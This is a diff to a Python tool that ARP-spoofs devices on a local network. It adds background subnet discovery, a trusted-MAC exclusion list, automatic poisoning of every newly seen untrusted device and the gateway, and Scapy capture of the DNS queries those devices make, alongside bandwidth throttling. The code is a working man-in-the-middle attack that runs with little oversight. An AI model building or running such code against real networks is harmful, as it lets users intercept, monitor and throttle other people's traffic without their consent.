@@ -15,6 +15,7 @@ from collections import defaultdict, deque
 from termcolor import colored
 import statistics
 import socket
+from collections import OrderedDict
 
 # -------------------------
 # Configuration
@@ -22,6 +23,7 @@ import socket
 class Config:
     # Monitoring interval (seconds)
     MONITOR_INTERVAL = 3
+    DISCOVERY_INTERVAL = 60
     
     # Traffic history length for ML analysis
     HISTORY_LENGTH = 20
@@ -132,23 +134,222 @@ def discover_clients(ip_range):
         print(colored(f"[!] ARP scan failed: {e}", "red"))
     return [{"ip": ip, "mac": mac} for ip, mac in found.items()]
 
+
+def discover_devices(interface):
+    """Discover active devices on local subnet via Scapy ARP broadcast.
+
+    Returns:
+        OrderedDict[int, dict]:
+            {
+              1: {"ip": "192.168.1.10", "mac": "aa:bb:...", "hostname": "phone"},
+              2: {...},
+            }
+    """
+    devices = []
+    subnet = get_subnet_cidr(interface)
+    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=subnet)
+
+    try:
+        answered, _ = scapy.srp(packet, timeout=2, verbose=False, iface=interface)
+        seen_ips = set()
+
+        for _, response in answered:
+            ip = response.psrc
+            mac = response.hwsrc.lower()
+            if ip in seen_ips:
+                continue
+            seen_ips.add(ip)
+
+            hostname = "Unknown"
+            try:
+                hostname = socket.gethostbyaddr(ip)[0]
+            except Exception:
+                pass
+
+            devices.append({"ip": ip, "mac": mac, "hostname": hostname})
+    except Exception as e:
+        print(colored(f"[!] Device discovery failed: {e}", "red"))
+
+    devices.sort(key=lambda d: tuple(int(part) for part in d["ip"].split(".")))
+    return OrderedDict((idx, dev) for idx, dev in enumerate(devices, start=1))
+
+
+class NetworkGatekeeper:
+    """Holds trusted/target lists and enforces exclusion checks."""
+
+    def __init__(self, trusted_macs=None):
+        self._trusted_macs = set(mac.lower() for mac in (trusted_macs or []))
+        self._targets = {}  # ip -> {"ip", "mac", "name"}
+
+    def set_targets(self, devices):
+        """Load target devices excluding trusted MACs."""
+        self._targets = {}
+        for ip, info in devices.items():
+            mac = info.get("mac", "").lower()
+            if mac in self._trusted_macs:
+                continue
+            self._targets[ip] = info
+
+    def add_trusted_mac(self, mac):
+        if not mac:
+            return
+        normalized = mac.lower()
+        self._trusted_macs.add(normalized)
+        # Remove from targets immediately if present
+        to_remove = [ip for ip, info in self._targets.items() if info.get("mac", "").lower() == normalized]
+        for ip in to_remove:
+            self._targets.pop(ip, None)
+
+    def is_trusted_mac(self, mac):
+        return bool(mac) and mac.lower() in self._trusted_macs
+
+    def get_trusted_macs(self):
+        return set(self._trusted_macs)
+
+    def get_target_devices(self):
+        return dict(self._targets)
+
+    def should_process_packet(self, src_mac, dst_mac):
+        src = (src_mac or "").lower()
+        dst = (dst_mac or "").lower()
+        return src not in self._trusted_macs and dst not in self._trusted_macs
+
+
+class BackgroundScanner:
+    """Background ARP discovery engine with thread-safe registry."""
+
+    def __init__(self, interface, subnet_cidr, trusted_macs=None, scan_interval=60):
+        self.interface = interface
+        self.subnet_cidr = subnet_cidr
+        self.scan_interval = max(5, int(scan_interval))
+        self.trusted_macs = set(mac.lower() for mac in (trusted_macs or []))
+
+        self._lock = threading.Lock()
+        self._discovered_devices = {}  # ip -> {"ip", "mac", "name", "last_seen"}
+        self._new_active_ips = set()
+
+        self._stop_event = threading.Event()
+        self._thread = None
+
+    def start(self):
+        if self._thread and self._thread.is_alive():
+            return
+        self._stop_event.clear()
+        self._thread = threading.Thread(target=self._scan_loop, daemon=True)
+        self._thread.start()
+
+    def stop(self):
+        self._stop_event.set()
+        if self._thread and self._thread.is_alive():
+            self._thread.join(timeout=2)
+
+    def update_trusted_macs(self, trusted_macs):
+        with self._lock:
+            self.trusted_macs = set(mac.lower() for mac in (trusted_macs or []))
+
+    def seed_devices(self, devices):
+        """Preload already-known devices into registry."""
+        now = time.time()
+        with self._lock:
+            for ip, info in devices.items():
+                mac = (info.get("mac") or "").lower()
+                if not mac:
+                    continue
+                self._discovered_devices[ip] = {
+                    "ip": ip,
+                    "mac": mac,
+                    "name": info.get("name") or f"Device-{ip.split('.')[-1]}",
+                    "last_seen": now,
+                }
+
+    def get_discovered_devices(self):
+        with self._lock:
+            return dict(self._discovered_devices)
+
+    def get_active_targets(self):
+        with self._lock:
+            return {
+                ip: dict(info)
+                for ip, info in self._discovered_devices.items()
+                if info.get("mac", "").lower() not in self.trusted_macs
+            }
+
+    def pop_new_active_targets(self):
+        with self._lock:
+            new_targets = {}
+            for ip in list(self._new_active_ips):
+                info = self._discovered_devices.get(ip)
+                if not info:
+                    continue
+                if info.get("mac", "").lower() in self.trusted_macs:
+                    continue
+                new_targets[ip] = dict(info)
+            self._new_active_ips.clear()
+            return new_targets
+
+    def _scan_loop(self):
+        while not self._stop_event.is_set():
+            self._scan_once()
+            self._stop_event.wait(self.scan_interval)
+
+    def _scan_once(self):
+        try:
+            clients = discover_clients(self.subnet_cidr)
+            now = time.time()
+            with self._lock:
+                for client in clients:
+                    ip = client.get("ip")
+                    mac = (client.get("mac") or "").lower()
+                    if not ip or not mac:
+                        continue
+
+                    is_new = ip not in self._discovered_devices
+                    if is_new:
+                        self._new_active_ips.add(ip)
+
+                    previous = self._discovered_devices.get(ip, {})
+                    self._discovered_devices[ip] = {
+                        "ip": ip,
+                        "mac": mac,
+                        "name": previous.get("name") or f"Device-{ip.split('.')[-1]}",
+                        "last_seen": now,
+                    }
+        except Exception:
+            pass
+
 # -------------------------
 # ARP Spoofing
 # -------------------------
 class ARPSpoofer:
-    def __init__(self, target, gateway):
+    def __init__(self, target, gateway, gatekeeper=None):
         self.target, self.gateway = target, gateway
+        self.gatekeeper = gatekeeper
         self.spoofing = threading.Event()
+
+    def send_spoof(self, target_ip, target_mac, spoof_ip):
+        """Send a spoof packet unless MAC is trusted."""
+        trusted_macs = self.gatekeeper.get_trusted_macs() if self.gatekeeper else set()
+        normalized_mac = (target_mac or "").lower()
+        if not normalized_mac:
+            return
+        if normalized_mac in trusted_macs:
+            return
+
+        pkt = scapy.Ether(dst=normalized_mac) / scapy.ARP(
+            op=2,
+            pdst=target_ip,
+            hwdst=normalized_mac,
+            psrc=spoof_ip,
+        )
+        scapy.sendp(pkt, verbose=False)
 
     def _spoof_loop(self):
         while not self.spoofing.is_set():
             # Send to target (tell target that gateway is at our MAC)
-            pkt1 = scapy.Ether(dst=self.target["mac"]) / scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
-            scapy.sendp(pkt1, verbose=False)
+            self.send_spoof(self.target["ip"], self.target["mac"], self.gateway["ip"])
             
             # Send to gateway (tell gateway that target is at our MAC)
-            pkt2 = scapy.Ether(dst=self.gateway["mac"]) / scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
-            scapy.sendp(pkt2, verbose=False)
+            self.send_spoof(self.gateway["ip"], self.gateway["mac"], self.target["ip"])
             
             time.sleep(5)
 
@@ -369,9 +570,10 @@ class TrafficMonitor:
 class ConnectionTracker:
     """Track active connections and DNS queries for each device"""
     
-    def __init__(self, devices, iface):
+    def __init__(self, devices, iface, gatekeeper=None):
         self.devices = devices
         self.iface = iface
+        self.gatekeeper = gatekeeper
         # Track with timestamps for recency
         self.connections = defaultdict(lambda: {
             "domains": deque(maxlen=50),  # (timestamp, domain)
@@ -389,56 +591,45 @@ class ConnectionTracker:
         threading.Thread(target=self._sniff_packets, daemon=True).start()
         
     def _sniff_packets(self):
-        """Capture DNS packets using tcpdump (low overhead, no userspace copy)"""
-        proc = None
+        """Capture DNS packets with Scapy callback and trusted-device filtering."""
         try:
-            cmd = ["tcpdump", "-i", self.iface, "-l", "-n", "udp", "port", "53"]
-            proc = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
+            scapy.sniff(
+                iface=self.iface,
+                store=False,
+                filter="udp port 53",
+                prn=self._packet_callback,
+                stop_filter=lambda _: self.running.is_set(),
             )
-            for line in proc.stdout:
-                if self.running.is_set():
-                    break
-                self._process_packet_fast(line.strip())
         except Exception as e:
-            print(colored(f"[!] tcpdump sniffing error: {e}", "yellow"))
-        finally:
-            if proc:
-                try:
-                    proc.terminate()
-                    proc.wait(timeout=2)
-                except Exception:
-                    proc.kill()
+            print(colored(f"[!] Scapy sniffing error: {e}", "yellow"))
 
-    def _process_packet_fast(self, line):
-        """Parse tcpdump DNS line for source IP and domain name"""
+    def _packet_callback(self, packet):
+        """Drop trusted devices immediately, then process DNS query packet."""
         try:
-            # Example tcpdump output:
-            # "14:23:45.123 IP 192.168.1.5.51234 > 8.8.8.8.53: 12345+ A? www.google.com. (33)"
-            if not line or 'IP' not in line:
+            if not packet.haslayer(scapy.Ether):
                 return
 
-            parts = line.split()
-            try:
-                ip_idx = parts.index('IP') + 1
-            except ValueError:
+            src_mac = packet[scapy.Ether].src.lower()
+            dst_mac = packet[scapy.Ether].dst.lower()
+
+            # Gatekeeper exclusion: trusted devices are never processed
+            if self.gatekeeper and not self.gatekeeper.should_process_packet(src_mac, dst_mac):
                 return
 
-            src_with_port = parts[ip_idx]
-            # Source is like "192.168.1.5.51234" — last dot-segment is the port
-            src_ip = src_with_port.rsplit('.', 1)[0]
+            if not packet.haslayer(scapy.IP):
+                return
+
+            src_ip = packet[scapy.IP].src
 
             # Only track DNS queries from monitored devices
             if src_ip not in self.devices:
                 return
 
-            # Extract domain from DNS query (look for query-type tokens)
-            domain = None
-            for i, part in enumerate(parts):
-                if part in ('A?', 'AAAA?', 'PTR?', 'MX?', 'CNAME?', 'TXT?', 'SRV?', 'SOA?', 'NS?'):
-                    if i + 1 < len(parts):
-                        domain = parts[i + 1].rstrip('.').rstrip('(').strip()
-                    break
+            if not packet.haslayer(scapy.DNSQR):
+                return
+
+            qname = packet[scapy.DNSQR].qname
+            domain = qname.decode(errors='ignore').rstrip('.') if isinstance(qname, bytes) else str(qname).rstrip('.')
 
             if not domain:
                 return
@@ -588,6 +779,7 @@ class BandwidthController:
         self.limits = {}  # {ip: {"down": kbps, "up": kbps}}
         self.spoofers = {}
         self.gateway = None
+        self.gatekeeper = None
         self._setup_tc()
 
     def _setup_tc(self):
@@ -607,12 +799,37 @@ class BandwidthController:
         """Set gateway for ARP spoofing"""
         self.gateway = gateway
 
+    def set_gatekeeper(self, gatekeeper):
+        """Set trusted-device gatekeeper for spoofing/safety checks."""
+        self.gatekeeper = gatekeeper
+
     def start_spoofing(self, target):
         """Start ARP spoofing for a device"""
         if target["ip"] not in self.spoofers:
-            spoofer = ARPSpoofer(target, self.gateway)
+            if self.gatekeeper and self.gatekeeper.is_trusted_mac(target.get("mac", "")):
+                return
+            spoofer = ARPSpoofer(target, self.gateway, gatekeeper=self.gatekeeper)
             self.spoofers[target["ip"]] = spoofer
             spoofer.start()
+
+    def sync_spoofers_from_registry(self, target_devices):
+        """Dynamically sync active spoofers from a shared registry snapshot."""
+        # Start spoofing for newly discovered targets
+        for ip, info in target_devices.items():
+            if ip in self.spoofers:
+                continue
+            self.start_spoofing({"ip": ip, "mac": info.get("mac", "")})
+
+        # Stop spoofing if a target disappeared or became trusted
+        for ip in list(self.spoofers.keys()):
+            info = target_devices.get(ip)
+            if info and not (self.gatekeeper and self.gatekeeper.is_trusted_mac(info.get("mac", ""))):
+                continue
+            try:
+                self.spoofers[ip].stop()
+            except Exception:
+                pass
+            self.spoofers.pop(ip, None)
 
     def apply_limit(self, ip, down_kbps, up_kbps):
         """Apply bandwidth limit using TC"""
